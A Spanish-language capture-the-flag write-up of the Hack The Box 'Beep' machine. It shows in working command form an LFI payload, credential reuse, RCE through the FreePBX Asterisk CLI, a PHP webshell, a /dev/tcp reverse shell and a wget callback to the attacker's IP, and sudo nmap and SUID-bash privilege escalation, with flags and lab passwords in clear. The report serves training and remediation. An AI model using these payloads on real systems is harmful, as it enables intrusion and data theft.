# REPORTE DETALLADO DE EXPLOTACIÓN - MÁQUINA BEEP (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Objetivo** | Beep (10.129.78.236) |
| **SO / Stack** | CentOS 5.6, kernel 2.6.18-238.12.1.el5 (i686), Apache 2.2.3, PHP 5.1.6 |
| **Aplicaciones** | Elastix 2.2, FreePBX 2.8.1, Asterisk 1.8.7.0, vtiger CRM 5, Webmin 1.570 |
| **IP atacante** | 10.10.14.194 (tun0 VPN HTB) |
| **Vulnerabilidad Inicial** | LFI pre-auth en vtigercrm (null byte, PHP 5.1.6) |
| **RCE** | Asterisk CLI de FreePBX + `dialplan add extension` → app `System()` |
| **Escalada** | sudo NOPASSWD → `nmap --interactive !id` / SUID bash |
| **Privilegio Obtenido** | **ROOT (uid=0)** |
| **Flags Obtenidas** | user.txt ✅ root.txt ✅ |

**Flags:**

| Flag | Valor | Archivo |
|------|-------|---------|
| USER | `b761684a13934f27c25ad227f819c9de` | `/home/fanis/user.txt` |
| ROOT | `7d98a0c01ee094fb7b4b98ed6c44df64` | `/root/root.txt` |

**Credenciales encontradas:**

| Usuario | Contraseña | Servicios |
|---------|-----------|-----------|
| `admin` | `jEhdIekWmdjE` | Elastix, FreePBX (Basic), ARI, FOP, AMI |
| `asteriskuser` | `jEhdIekWmdjE` | MySQL / FreePBX DB |

---

## Fase 0: Preparación del entorno

```bash
$ which searchsploit gobuster ffuf nikto curl nmap hydra
/usr/bin/searchsploit, gobuster, ffuf, nikto, curl, nmap, hydra

$ ip -4 addr show
2: eth0: inet 192.168.231.166/24
4: tun0:  inet 10.10.14.194/23      # VPN HTB - IP atacante para callbacks
```

---

## Fase 1: Reconocimiento

### 1.1 Escaneo inicial (nmap -sCV)

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       PIPELINING, SIZE, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3 -> redirect https://10.129.78.236/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000) - status en 854/udp y 857/tcp
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 (CentOS) - "Elastix - Login page"
             ssl-cert: CN=localhost.localdomain (self-signed, RSA 1024, sha1)
             http-robots.txt: 1 disallowed entry: /
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

### 1.2 Primer obstáculo: TLS 1.0 obligatorio

Primer intento ingenuo de curl:

```bash
$ curl -sk -m 20 https://10.129.78.236/
* TLSv1.3 (OUT) Client hello
* TLS connect error: error:0A000102:SSL routines::unsupported protocol
```

Diagnóstico con openssl:

```bash
$ for t in -tls1 -tls1_1 -tls1_2; do
    echo Q | timeout 15 openssl s_client -connect 10.129.78.236:443 $t 2>&1 | grep -E "Protocol|Cipher|error"
  done

=== -tls1 ===
CONNECTED(00000003)
New, SSLv3, Cipher is DHE-RSA-AES256-SHA          <- OK
=== -tls1_1 ===
error:0A000102:SSL routines:ssl_choose_client_version:unsupported protocol
=== -tls1_2 ===
error:0A000102:SSL routines:ssl_choose_client_version:unsupported protocol
```

**Conclusión: el servidor solo soporta SSLv3/TLS 1.0**, además con certificado caducado y RSA-1024/SHA1 → hace falta `SECLEVEL=0`:

```bash
$ curl -sk -m 15 --tlsv1.0 --tls-max 1.0 --ciphers 'DEFAULT@SECLEVEL=0' \
    https://10.129.78.236/ -o beep_index.html -w "code:%{http_code} size:%{size_download}\n"
code:200 size:1785
```

**Error propio (zsh):** `C="curl -sk ..."; $C url` falla porque zsh no hace word-splitting de variables → *"command not found"*. Solución: **wrapper ejecutable** usado en toda la auditoría:

```bash
$ cat > /tmp/opencode/curltls.sh <<'EOF'
#!/bin/bash
# curl wrapper forcing TLS1.0 (Beep only supports SSLv3/TLS1.0)
exec curl -sk -m 25 --tlsv1.0 --tls-max 1.0 --ciphers 'DEFAULT@SECLEVEL=0' "$@"
EOF
$ chmod +x /tmp/opencode/curltls.sh
$ C=/tmp/opencode/curltls.sh
```

**Obstáculo derivado:** `ffuf`, `gobuster`, `nikto` y `nuclei` usan TLS ≥1.2 por defecto y **fallaban contra este target** (sin flag de versión TLS). La enumeración de rutas se hizo con **curl directo sobre listas de rutas candidatas** en lugar de fuzzing a ciegas.

### 1.3 Landing page y robots

```bash
$ $C https://10.129.78.236/
<title>Elastix - Login page</title>
<input type="text" id="input_user" name="input_user" .../>
<input type="password" name="input_pass" ... />
<input type="submit" name="submit_login" value="Submit"/>
```

Parámetros de login: **`input_user`, `input_pass`, `submit_login`** (POST a `/`).

### 1.4 Enumeración de rutas (curl manual, sin fuzzers)

```bash
$ for p in /panel/ /vtigercrm/index.php /recordings/misc/callme_page.php \
           /mail/scrum.php /admin/ /phpmyadmin/ /freePBX/ /mobile/ /class/ \
           /webservice/ /mail/miniserv.php /config /ajax; do
    code=$($C -o /dev/null -w "%{http_code}:%{size_download}" "https://10.129.78.236$p")
    echo "$code  $p"
  done

200:1065  /panel/                          <- Flash Operator Panel (FOP)
404:281   /ari/
200:6499  /vtigercrm/index.php             <- vtiger CRM 5  ** OBJETIVO LFI **
200:400   /recordings/misc/callme_page.php <- candidato CVE-2012-4869
302:0     /admin/                          <- redirect -> config.php (FreePBX)
404:291   /phpmyadmin/  /freePBX/ /mobile/ /class/ /webservice/ /ajax ...
```

Detalle relevante:

```bash
$ $C "https://10.129.78.236/vtigercrm/index.php" | grep -oiE '<title>.*</title>'
<title>vtiger CRM 5 - Commercial Open Source CRM</title>

$ $C -D - -o /dev/null "https://10.129.78.236/admin/"
HTTP/1.1 302 Found
Location: config.php
X-Powered-By: PHP/5.1.6                  <- PHP 5.1.6 => null-byte truncation viable

$ $C -D - -o /dev/null "https://10.129.78.236/admin/config.php"
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="FreePBX Administration"   <- HTTP Basic
Set-Cookie: PHPSESSID=0s3jla98ufsi2l1sdl0hs9f9a3

$ $C "https://10.129.78.236/panel/"
<title>Flash Operator Panel</title>
```

---

## Fase 2: Búsqueda de exploits (searchsploit)

```bash
$ searchsploit elastix
Elastix 2.2.0 - 'graph.php' Local File Inclusion       | php/webapps/37637.pl     <- EVALUADO
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py     <- EVALUADO
Elastix < 2.5 - PHP Code Injection                     | php/webapps/38091.php
Elastix 2.x - Blind SQL Injection                       | php/webapps/36305.txt

$ searchsploit freepbx
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py
FreePBX 2.11.0 - Remote Command Execution               | php/webapps/32214.pl
Freepbx < 2.11.1.5 - Remote Code Execution              | php/webapps/41005.txt

$ searchsploit webmin 1.570
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution        | linux/webapps/47330.rb   (no usada)
```

Revisión de código de los candidatos:

```bash
$ searchsploit -x php/webapps/37637.pl
# Exploit Title: Elastix 2.2.0 LFI
# /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

$ searchsploit -x php/webapps/18650.py
# FreePBX / Elastix pre-authenticated RCE (CVE-2012-4869 / OSVDB-80544)
# url = 'https://'+rhost+'/recordings/misc/callme_page.php?action=c&callmenum='
#       +extension+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl ...'
# comentario incluido: "On Elastix, once we have a shell ... sudo nmap --interactive ... !sh"
```

**Evaluación:** 37637 (LFI) → vector inicial; 18650 (RCE pre-auth) → candidato a shell. El comentario del propio exploit ya insinuaba la ruta de escalada (`sudo nmap --interactive`), confirmada luego con `sudo -l`.

---

## Fase 3: Explotación del LFI (vtiger CRM)

### 3.1 Lectura de `/etc/amportal.conf` (null byte)

```
GET /vtigercrm/graph.php?module=Accounts&action=&
    current_language=../../../../../../../..//etc/amportal.conf%00
```

```bash
$ $C "https://10.129.78.236/vtigercrm/graph.php?module=Accounts&action=&current_language=../../../../../../../..//etc/amportal.conf%00" \
     -o /tmp/opencode/amportal.txt -w "code:%{http_code} size:%{size_download}\n"
code:200 size:13779
```

Contenido (líneas no comentadas):

```
AMPDBHOST=localhost
AMPDBENGINE=mysql
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109                 <- default COMENTADA
AMPDBPASS=jEhdIekWmdjE             <- contraseña real
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111                 <- default comentada
AMPMGRPASS=jEhdIekWmdjE
FOPPASSWORD=jEhdIekWmdjE
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
AUTHTYPE=database
AMPWEBROOT=/var/www/html
FOPWEBROOT=/var/www/html/panel      <- raíz web del FOP (luego escribible)
ASTETCDIR=/etc/asterisk
```

### 3.2 Lectura de `/etc/passwd`

```bash
$ $C "...current_language=../../../../../../../..//etc/passwd%00" -o passwd.txt -w "code:%{http_code} size:%{size_download}\n"
code:200 size:1679
```

```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:76:Cyrus IMAP Server:/var/lib/imap:/bin/bash
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
fanis:<flag user>                                   <- home del usuario
```

### 3.3 Intentos fallidos de lectura

```bash
$ for f in /var/log/httpd/access_log /var/log/httpd/error_log /var/log/secure; do
    $C "...current_language=../../../../../../../..//${f}%00"
  done
200 (size:41)  Sorry! Attempt to access restricted file.   # idéntico para los 3 -> log poisoning descartado
```

```bash
$ $C "...current_language=php://filter/convert.base64-encode/resource=/var/www/html/recordings/misc/callme_page%00"
200 (size:41)  Sorry! Attempt to access restricted file.   # wrapper php:// rechazado por file_exists()
```

---

## Fase 4: Autenticación

### 4.1 Intentos fallidos

Panel Elastix (POST) — misma landing (1785 B) = sin sesión:

```bash
$ $C -d "input_user=admin&input_pass=admin&submit_login=Submit" https://10.129.78.236/
code:200 size:1785
# Fallan: admin:admin, admin:password, admin:eLAsTiX, admin:elastix, admin:, root:jEhdIekWmdjE, admin:amp111, admin:1234
```

vtiger CRM (POST) — todos 302 = sin validar:

```bash
admin:admin / admin:123456 / admin: / admin:vtiger / admin:password  ->  code:302
```

### 4.2 FreePBX HTTP Basic (¡éxito!)

```bash
$ for cred in "admin:jEhdIekWmdjE" "admin:amp109" "admin:amp111" "admin:admin" \
              "admin:password" "admin:elastix" "admin:eLAsTiX" "admin:" \
              "asteriskuser:jEhdIekWmdjE" "admin:freePBX" "root:jEhdIekWmdjE" "admin:1234"; do
    code=$($C -u "$cred" -o /dev/null -w "%{http_code}" "https://10.129.78.236/admin/config.php")
    echo "$code  $cred"
  done

200  admin:jEhdIekWmdjE      <-- CREDENCIAL VÁLIDA
401  admin:amp109 / amp111 / admin / password / elastix / eLAsTiX / "" / asteriskuser / freePBX / root / 1234
```

### 4.3 Panel Elastix con la credencial válida

```bash
$ $C -c elastix_c.txt -d "input_user=admin&input_pass=jEhdIekWmdjE&submit_login=Submit" \
     "https://10.129.78.236/" -D elastix_h.txt -o elastix_login.html
code:302 size:0
Set-Cookie: elastixSession=7e5781ftrfdutlp639p5pp5362; path=/
Location: index.php

$ $C -b elastix_c.txt "https://10.129.78.236/index.php" -o elastix_dash.html
code:200 size:27170     <- dashboard autenticado
```

### 4.4 Enumeración de módulos FreePBX autenticado

```bash
$ $C -u "admin:jEhdIekWmdjE" "https://10.129.78.236/admin/config.php" -o fpbx.html
code:200 size:25755
$ grep -oE 'display=[a-zA-Z0-9_]+' fpbx.html | sort -u
display=cli, logfiles, phpinfo, manager, extensions, recording, restart, weakpasswords, ...
```

Módulos de interés: **`display=cli`** (Asterisk CLI), `display=logfiles`, `display=phpinfo`, `display=manager` (AMI).

```bash
$ $C -u "admin:jEhdIekWmdjE" "https://10.129.78.236/admin/config.php?display=phpinfo"
disable_functions -> no value
safe_mode         -> Off
open_basedir      -> no value
allow_url_fopen   -> On
document_root     -> /var/www/html
```

---

## Fase 5: Obtención de RCE

### 5.1 Listeners preparados

```bash
$ setsid nohup nc -lvnp 4443 > /tmp/opencode/beep_shell_out.txt 2>&1 < /dev/null & disown
$ setsid nohup python3 -m http.server 8000 --bind 0.0.0.0 --directory /tmp/opencode > /tmp/opencode/http8000.log 2>&1 < /dev/null & disown
LISTEN 0.0.0.0:4443   LISTEN 0.0.0.0:8000
```

### 5.2 Intento fallido: CVE-2012-4869 (callme_page.php)

Primer intento con curl falló por espacios sin URL-encodear (`code:000`). Reescrito en Python con TLS 1.0 forzado:

```python
# /tmp/opencode/freepbx_rce.py
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1
ctx.set_ciphers("DEFAULT@SECLEVEL=0")
inj = "1000@from-internal/n\r\nApplication: system\r\nData: " + CMD + "\r\n\r\n"
url = "https://%s/recordings/misc/callme_page.php?%s" % (TARGET,
      urllib.parse.urlencode({"action": "c", "callmenum": inj}))
```

```bash
$ python3 freepbx_rce.py "curl http://10.10.14.194:8000/RCE_TEST_$(id -u)"
[+] HTTP 200
... 'The call failed.  Perhaps the line was busy.' ...
$ cat http8000.log   -> sin callback del target
```

Confirmado después con el log de Asterisk (5.4): se ejecutó el **dialplan normal**, la inyección AMI nunca se aplicó.

### 5.3 Descubrimiento: el "Asterisk CLI" de FreePBX

```bash
$ $C -u "admin:jEhdIekWmdjE" "https://10.129.78.236/admin/config.php?display=cli" -o fpbx_cli.html
code:200 size:14963
<form action="config.php?type=tool&display=cli" method="POST" ...>
<input name="txtCommand" type="text" size="70" ...>
<input type="submit" class="button" value="Execute:" ...>
```

Prueba de vida:

```bash
$ $C -u "admin:jEhdIekWmdjE" --data-urlencode "txtCommand=core show version" \
     "https://10.129.78.236/admin/config.php?type=tool&display=cli"
<pre>Asterisk 1.8.7.0 built by palosanto @ rpmbuild32-2.elastix.palosanto.com on a i386 running Linux on 2011-09-23
FreePBX 2.8.1 is licensed under GPL
```

**POST `txtCommand` → `asterisk -rx "<cmd>"` como usuario `asterisk`.**

### 5.4 Intento fallido: `originate Echo/1` + log de Asterisk

```bash
$ $C -u ... --data-urlencode 'txtCommand=originate Echo/1 application system "curl http://10.10.14.194:8000/from_cli"' ...
<pre></pre>       # sin error visible pero sin efecto
```

Diagnóstico con el visor de logs (bloqueado por CSRF si no hay Referer):

```bash
# Sin Referer -> bloqueado:
$ $C -u "admin:jEhdIekWmdjE" -d "lines=1000" ".../config.php?display=logfiles&type=tool&action=showlog"
Potential Security Breach ... set CHECKREFERER=false in amportal.conf ...

# Con Referer -> OK:
$ $C -u "admin:jEhdIekWmdjE" -e "https://10.129.78.236/admin/config.php?display=logfiles" \
     -d "lines=400" ".../config.php?display=logfiles&type=tool&action=showlog" -o alog.html   # size:55379
```

```
[Sep 30 20:15:05] WARNING[4588] channel.c: No channel type registered for 'Echo'    <- Echo es app, no canal
[Sep 30 20:13:19] VERBOSE[4571] pbx.c: -- Executing [1000@from-internal:1] ResetCDR(...)   <- CVE-2012-4869: dialplan normal
== Spawn extension (from-internal, 1000, 8) exited non-zero
```

### 5.5 Vía exitosa: `dialplan add extension` + `System()` + `originate`

Sintaxis descubierta con el propio CLI:

```
Usage: dialplan add extension <exten>,<priority>,<app>,<app-data> into <context> [replace]
Example: dialplan add extension 6123,1,Dial,IAX/216.207.245.56/6123 into local
```

Primer añadido (app-data **obligatoriamente entre comillas dobles**; sin ellas → Usage):

```bash
$ $C -u "admin:jEhdIekWmdjE" --data-urlencode \
     'txtCommand=dialplan add extension 9999,1,System,"echo PWNED_RCE >/var/www/html/own.txt" into from-internal' \
     "https://10.129.78.236/admin/config.php?type=tool&display=cli"
Extension '9999,1,System,echo PWNED_RCE >/var/www/html/own.txt' added into 'from-internal' context

$ $C -u ... --data-urlencode "txtCommand=originate Local/9999@from-internal application Wait 1"
$ $C "https://10.129.78.236/own.txt"     -> 404   <- ejecutado pero /var/www/html NO escribible
```

Evidencia en el log de Asterisk:

```
[Sep 30 20:18:10] VERBOSE[4644] pbx.c: -- Added extension '9999' priority 1 to from-internal
[Sep 30 20:18:11] VERBOSE[4650] pbx.c: -- Executing [9999@from-internal:1] System("Local/9999@from-internal-c376;2", "echo PWNED_RCE >/var/www/html/own.txt") in new stack
```

### 5.6 Directorios escribibles + validación con callback

```bash
$ dialplan add extension 9998,1,System,"wget -q -O /dev/null http://10.10.14.194:8000/wget_ok" into from-internal
$ dialplan add extension 9999,1,System,"echo PWN>/var/www/html/recordings/t.txt;echo PWN>/var/www/html/panel/t.txt;echo PWN>/var/www/html/t.txt;echo PWN>/var/spool/asterisk/t.txt" into from-internal replace
$ originate Local/9998@from-internal application Wait 1
$ originate Local/9999@from-internal application Wait 1

$ for p in /recordings/t.txt /panel/t.txt /t.txt; do ...; done
/recordings/t.txt -> 200 PWN     <- escribible y servida por Apache
/panel/t.txt      -> 200 PWN     <- escribible y servida por Apache
/t.txt            -> 404         <- raíz NO escribible

$ cat http8000.log
10.129.78.236 - - [30/Sep/2026 13:20:28] "GET /wget_ok HTTP/1.0" 404 -   <- ¡callback del target!
```

**RCE validada por dos vías independientes:** callback de red + escritura en raíz web.

### 5.7 Webshell

Restricciones del canal: FreePBX envuelve el comando en `'...'` (no `'` simples) y Asterisk CLI separa por `,` → payloads en **base64**:

```bash
$ echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg== | base64 -d
<?php system($_GET["c"]); ?>

$ dialplan add extension 9999,1,System,"echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg== | base64 -d >/var/www/html/panel/shell.php" into from-internal replace
$ originate Local/9999@from-internal application Wait 1

$ $C "https://10.129.78.236/panel/shell.php?c=id"
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
```

Wrapper de comodidad:

```bash
S(){ $C -G --data-urlencode "c=$1" "https://10.129.78.236/panel/shell.php"; echo; }
```

### 5.8 Reverse shell de respaldo

```bash
$ $C -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.194/4443 0>&1" "https://10.129.78.236/panel/shell.php" &
connect to [10.10.14.194] from (UNKNOWN) [10.129.78.236] 54390
bash: no job control in this shell
bash-3.2$
```

> Limitación: el `nc` de escucha tenía stdin en `/dev/null` → canal solo de salida. Se iteró con el webshell (payloads autocontenidos).

---

## Fase 6: Post-explotación / enumeración local

```bash
$ S "uname -a"
Linux beep 2.6.18-238.12.1.el5 #1 SMP Tue May 31 13:23:01 EDT 2011 i686 athlon i386 GNU/Linux

$ S "cat /etc/issue"
CentOS release 5.6 (Final)
```

```bash
$ S "sudo -l"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap            <- vector clásico de Beep
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod                <- vía B
    (root) NOPASSWD: /bin/chown                <- vía B
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

```bash
$ S "ls -la /home"
drwxrwxr-x  2 fanis fanis 4096 Oct 26  2023 fanis      <- usuario con flag
drwx------  2 spamfilter spamfilter ...                 <- sin acceso

$ S "find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null"
/home/fanis/user.txt

$ S "ls -la /home/fanis"
-rw-rw-r-- 1 fanis fanis 33 Sep 30 19:31 user.txt      <- legible por others

$ S "find / -perm -4000 -type f 2>/dev/null"
/usr/bin/sperl5.8.8, gpasswd, passwd, sudo, chsh, crontab, at, chage, sudoedit,
chfn, newgrp, vmware-user-suid-wrapper, mc.saver, ssh-keysign, ccreds_validate,
userhelper, suexec, usernetctl, ksu, mount, umount, su, ping, ping6,
dbus-daemon-launch-helper, pam_timestamp_check, mount.nfs, umount.nfs, unix_chkpwd
  (nada inusual/propio de la máquina)

$ S "ls -la /root"
ls: /root: Permission denied              <- directorio en 700

$ mount | head -1
/dev/mapper/VolGroup00-LogVol00 on / type ext3 (rw)     <- / SIN nosuid => SUID viable
```

---

## Fase 7: Escalada a Root (dos vías)

### 7.1 Vía A — `sudo nmap --interactive` (clásica de Beep)

nmap 4.11 local (¡tiene `--interactive`!):

```bash
$ S "nmap --version | head -1"
Nmap version 4.11 ( http://www.insecure.org/nmap/ )

$ printf '!id\n' | sudo /usr/bin/nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
EOF reached -- quitting
QUITTING!
```

> Variante que **no** funcionó: `echo -e '!sh\nid\ncat /root/root.txt' | sudo nmap --interactive` → el subshell de `!sh` terminaba antes de leer las líneas siguientes:
> ```
> nmap> Unknown command (id) -- press h <enter> for help
> nmap> Unknown command (cat) -- press h <enter> for help
> ```

### 7.2 Vía B — SUID bash (la usada para capturar la flag)

`/root` en 700 y `root.txt` en 600 → hacía falta **euid root**:

```bash
$ S "cp /bin/bash /var/www/html/panel/.b; sudo /bin/chown root /var/www/html/panel/.b; \
     sudo /bin/chmod 4755 /var/www/html/panel/.b; ls -la /var/www/html/panel/.b"
-rwsr-xr-x 1 root asterisk 735004 Sep 30 20:23 /var/www/html/panel/.b

$ S "/var/www/html/panel/.b -p -c 'id; cat /root/root.txt'"
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
7d98a0c01ee094fb7b4b98ed6c44df64
```

(`/var/www/html/panel` porque `/` está en ext3 **sin** `nosuid` y ya sabíamos ese directorio escribible por `asterisk`.)

---

## Fase 8: Captura de flags

```bash
$ S "cat /home/fanis/user.txt"
b761684a13934f27c25ad227f819c9de

$ S "/var/www/html/panel/.b -p -c 'echo USER:; cat /home/fanis/user.txt; echo ROOT:; cat /root/root.txt; id'"
USER:
b761684a13934f27c25ad227f819c9de
ROOT:
7d98a0c01ee094fb7b4b98ed6c44df64
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
```

---

## Fase 9: Limpieza

```bash
# 1) Borrado de webshell, SUID y ficheros de prueba (webshell aún viva)
$ S "rm -f /var/www/html/panel/.b /var/www/html/panel/shell.php /var/www/html/panel/t.txt /var/www/html/recordings/t.txt"

# 2) Validación
$ $C "https://10.129.78.236/panel/shell.php" -w "shell:%{http_code}\n"      -> shell:404
$ $C "https://10.129.78.236/panel/rootperm.txt" -w "rootperm:%{http_code}\n" -> rootperm:404

# 3) Restaurar /root a 700 (vía Asterisk CLI)
$ dialplan add extension 9999,1,System,"sudo /bin/chmod 700 /root" into from-internal replace
$ originate Local/9999@from-internal application Wait 1
# verificación: ls -ld /root > /var/www/html/panel/rootperm.txt -> drwx------ 2 root root /root
# borrado del fichero de verificación -> HTTP 404

# 4) Borrado de extensiones del dialplan (sintaxis corregida)
$ dialplan remove extension 9999,1 into from-internal
Usage: dialplan remove extension exten[/cid]@context [priority]     <- errata
$ dialplan remove extension 9999@from-internal 1
Extension 9999@from-internal with priority 1 removed
$ dialplan remove extension 9998@from-internal 1
Extension 9998@from-internal with priority 1 removed
$ dialplan show 9999@from-internal    -> ya no existe

# 5) Listeners locales
$ kill <python http.server>; pkill -f "nc -lvnp 4443"
$ ss -ltn | grep -E ':4443|:8000'     -> listeners down
```

Comprobación final: target vivo y web limpia (`https:200`).

---

## Fase 10: Vectores fallidos / abortados

| # | Vector | Motivo del fallo |
|---|--------|------------------|
| 1 | HTTPS con TLS moderno | `SSL routines::unsupported protocol` — solo SSLv3/TLS1.0 |
| 2 | ffuf/gobuster/nikto/nuclei | TLS ≥1.2 por defecto, sin flag de versión TLS |
| 3 | Variable zsh `C="curl ..."; $C url` | zsh sin word-splitting → wrapper script |
| 4 | Login Elastix defaults (admin:admin...) | 200 con la misma landing, sin cookie de sesión |
| 5 | Login vtiger CRM | 302 en todos los intentos |
| 6 | FreePBX con otras creds | HTTP 401 (solo `admin:jEhdIekWmdjE` → 200) |
| 7 | MySQL remoto 3306 | `ERROR 2013 ... system error: 110`, sin banner → solo local |
| 8 | CVE-2012-4869 (`callme_page.php`) | 200 pero "The call failed"; log → dialplan normal, AMI ignorada |
| 9 | Payload con espacios en curl | `code:000` (curl rechaza URL con espacios) → Python urlencode |
| 10 | `originate Echo/1` | `No channel type registered for 'Echo'` (Echo es app, no canal) |
| 11 | LFI de logs (`/var/log/httpd/*.log`) | `Sorry! Attempt to access restricted file.` (root-only) |
| 12 | LFI `php://filter` | wrapper rechazado por `file_exists()` |
| 13 | Escritura en raíz web | ejecutado (log lo confirma) pero HTTP 404 → dir no writable |
| 14 | `showlog` sin Referer | `Potential Security Breach` → añadir `-e <referer>` |
| 15 | `dialplan add extension` sin comillas en app-data | devuelve Usage |
| 16 | `dialplan remove extension 9999,1 into ...` | Usage erróneo → `... 9999@from-internal 1` |
| 17 | `!sh` de nmap con stdin embebido | subshell termina antes → `Unknown command (id)` → `!id` directo |

---

## Fase 11: Obstáculos resueltos

1. **TLS 1.0 obligatorio** → wrapper `/tmp/opencode/curltls.sh` (`--tlsv1.0 --tls-max 1.0 --ciphers 'DEFAULT@SECLEVEL=0'`); todo el trabajo web pasó por él.
2. **zsh sin word-splitting** → de variable de shell a script ejecutable.
3. **Fuzzers inutilizables** → enumeración manual de rutas con curl.
4. **`/var/www/html` no escribible por `asterisk`** → prueba multi-destino con `;` → `/panel` y `/recordings` escribibles.
5. **Comillas prohibidas en el canal RCE** → payloads en base64, sin comillas simples, sin comas.
6. **Log de Asterisk bloqueado por CSRF** → cabecera `-e "https://.../config.php?display=logfiles"`.
7. **Reverse shell no interactuable** → comandos autocontenidos vía webshell.
8. **`/root` 700 / `root.txt` 600** → hizo falta euid root (SUID bash) y restaurar `/root` a 700.
9. **Sintaxis de `dialplan remove`** → corregida leyendo el Usage del propio CLI.

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | ID |
|---------|---------|-----|
| Reconocimiento | Active Scanning: port scan | T1046 |
| Reconocimiento | Gather Victim Host Info: Determine architecture | T1592 |
| Acceso Initial | Exploitation of Remote Services | T1210 |
| Acceso Initial | External Remote Services | T1133 |
| Acceso Credential | Unsecured Credentials: Credentials In Files | T1552.001 |
| Acceso Credential | Brute Force (reutilización de credenciales) | T1110 |
| Ejecución | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Ejecución | Scheduled Task/Job: Cron (alternativa) | T1053.003 |
| Escalada | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Escalada | Hijack Execution Control Flow: Setuid Binary | T1548.016 |

---

## Hallazgos y Remediación

| # | Hallazgo | Severidad | Evidencia | Remediación |
|---|----------|-----------|-----------|-------------|
| 1 | LFI pre-auth en `/vtigercrm/graph.php` (null byte, PHP 5.1.6) | **CRÍTICO** | GET `...current_language=../../../../..//etc/amportal.conf%00` → 200 (13779 B) | Act. PHP/FreePBX/Elastix, filtrar `../` y `%00`, WAF, rotar credenciales |
| 2 | RCE autenticado vía Asterisk CLI + `dialplan add extension` (`System`) | **CRÍTICO** | callback `GET /wget_ok` desde 10.129.78.236; escritura en `/panel` + `/recordings` | Desactivar tool CLI, exigir 2FA, restringir AMI CLI |
| 3 | Credencial reutilizada `admin:jEhdIekWmdjE` (Elastix+FreePBX+ARI+FOP+AMI) | **ALTO** | 200 OK en `/admin/config.php`, sesión Elastix 302 | Contraseñas únicas, rotación, cerrar paneles públicos |
| 4 | sudo NOPASSWD excesivo para `asterisk` (14 binarios) | **ALTO** | `sudo -l`; `nmap --interactive` → `!id` → uid=0 | Eliminar reglas sudo, principio de mínimo privilegio |
| 5 | Stack obsoleto/expuesto: Apache 2.2.3, OpenSSH 4.3, Webmin 1.570, PHP 5.1.6, kernel 2.6.18-238 (CentOS 5.6) | **MEDIO** | nmap -sCV, X-Powered-By | Actualizar/sustituir SO; cerrar 3306/4445/10000/110/143/993/995 en firewall |
| 6 | MySQL 3306 expuesto, SMTP con VRFY (enum usuarios), robots.txt con `/`, cert autofirmado caducado RSA-1024/SHA1 | **BAJO** | nmap, robots.txt, ssl-cert | Cerrar puertos, deshabilitar VRFY, cert válido |

---

## Éxito del Ataque

| Objetivo | Estado |
|----------|--------|
| Acceso al sistema | Completado (asterisk) |
| Privilegio Root | Obtenido (uid=0 / euid=0) |
| user.txt | `b761684a13934f27c25ad227f819c9de` |
| root.txt | `7d98a0c01ee094fb7b4b98ed6c44df64` |
| Limpieza | Completada (webshell, SUID, dialplan, listeners, /root 700) |

---

## Archivos del caso

| Archivo | Contenido |
|---------|-----------|
| `/home/kali/HTB/informes/informe_beep.md` | Este informe |
| `/home/kali/HTB/beep/beep_flags.txt` | Flags + cadena de ataque (resumen) |
| `/home/kali/HTB/beep/nmap.txt` | Escaneo inicial `nmap -sCV` |
| `/tmp/opencode/curltls.sh` | Wrapper curl TLS 1.0 |
| `/tmp/opencode/freepbx_rce.py` | Explotación CVE-2012-4869 (fallida, documentada) |
